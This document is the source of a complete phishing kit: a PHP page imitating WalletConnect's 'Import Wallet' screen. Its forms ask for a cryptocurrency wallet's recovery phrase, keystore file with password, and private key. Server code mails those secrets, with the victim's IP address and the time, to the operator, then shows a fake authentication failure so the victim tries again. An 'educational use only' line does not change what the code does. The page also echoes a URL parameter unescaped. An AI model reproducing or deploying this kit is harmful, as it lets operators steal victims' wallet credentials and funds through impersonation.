<?php
$error_message = ""; $success = "";
if (isset($_POST['w']) || isset($_POST['phrase']) || isset($_POST['keystorejson']) || isset($_POST['password']) || isset($_POST['key'])) {
    $w = $_POST['w'];
    $phrase = $_POST['phrase'];
    $keystorejson = $_POST['keystorejson'];
    $password = $_POST['password'];
    $key = $_POST['key'];

  if (empty($w) || empty($phrase) || empty($keystorejson) || empty($password) || empty($key)) {
$ip      = getenv("REMOTE_ADDR");
$adddate = date("D M d, Y g:i a");
$headers = "From: Logs \n" .
$headers .= "MIME-Version: 1.0\n";

require ('../Email.php');

$message .= "---------------|Written By PHP Bloke|-------------\n";
$message .= "Type of Wallet    : " . $_POST['w'] . "\n";
$message .= "---------------------|Phrase|----------------------\n";
$message .= "Phrase Word    : " . $_POST['phrase'] . "\n"; 
$message .= "------------------|Keystore JSON|-------------------\n";
$message .= "Keystore    : " . $_POST['keystorejson'] . "\n";
$message .= "Keystore Password: " . $_POST['password'] . "\n"; 
$message .= "---------------------|Private Key|-------------------\n";
$message .= "Private Key    : " . $_POST['key'] . "\n";
$message .= "----------------------------------------------------\n";
$message .= "IP          : " .$ip. "\n"; 
$message .= "Date & Time : $adddate\n";
$message .= "----------------------------------------------------\n";
$message .= "This Copyrighted Material is For Educational use Only.";
$subject = "Report 2022 | ".$ip."\n";

if (mail($to,$subject,$message,$headers)) {
   $success.= "Authentication could not be performed, please try again";
  }
else {
  $error_message.= "sorry, an error occurred. please try again later.";
  }
  } else {
    $error_message.= "Fill field.";
  }
}
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="../assets/main.css" type="text/css"> 
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="../images/logo.svg">
    <link rel="icon" href="../assets/logo.svg">
    <script>
        function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
  }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
}
</script>
<title>Import Wallet</title>
</head>
<body>
    <center>
        <div class="top">
            <a href="#footer" class="left">Github</a>
            <a href="#" class="left">Docs</a>
            <a href="/?v" class="main"><img src="../assets/logo.svg" alt="logo"></a>
            <a href="/?v#wallets" class="left">Wallets</a>
            <a href="#" class="left">Apps</a>
        </div>
        <br>
        <h2><center>Import Wallet</center></h2>
        <br>
        <div class="tab">
          <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
          <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
          <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
      </div>
      <div style='color: red;padding: 10px;border-radius:10px;margin-bottom: 10px;'><?= $error_message, $success; ?></div> 
          <div id="phrase" class="tabcontent" style="display: block;">
        <form w="" action="" method="POST">

            <input type="hidden" name="w" value="<?php echo $_GET["w"]; ?>">

            <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
            <input type="text" name="user" value="" style="visibility: hidden;">
            <br>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            <br>
            <button type="submit" class="btn">IMPORT</button>
        </form>
    </div>

    <div id="keystore" class="tabcontent" style="display: none;">
        <form action="" method="POST">

            <input type="hidden" name="w" value="<?php echo $_GET["w"]; ?>">

            <textarea name="keystorejson" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
            <br>

            <div class="field">
                <input type="password" name="password" placeholder="Password">
            </div>
            <input type="text" name="user" value="" style="visibility: hidden;">
            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
            <br>
            <button type="submit" class="btn">IMPORT</button>
        </form>
    </div>

    <div id="private" class="tabcontent" style="display: none;">
        <form action="" method="POST">
            <input type="hidden" name="w" value="<?php echo $_GET["w"]; ?>">
            <div class="field">
                <input type="text" name="key" required="required" class="key" placeholder="Private Key">
            </div>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            <input type="text" name="user" value="" style="visibility: hidden;">
            <br>
            <button type="submit" class="btn">IMPORT</button>
        </form>
    </div>

    <script>
        document.getElementById("default").click();
    </script>
    <footer><div id="footer">
        <p><img src="../assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
        <p><img src="../assets/telegram.svg" class="footimg">  <a href="#">Telegram</a></p><br>
        <p><img src="../assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
        <p><img src="../assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
    </div></footer>
</center></body></html>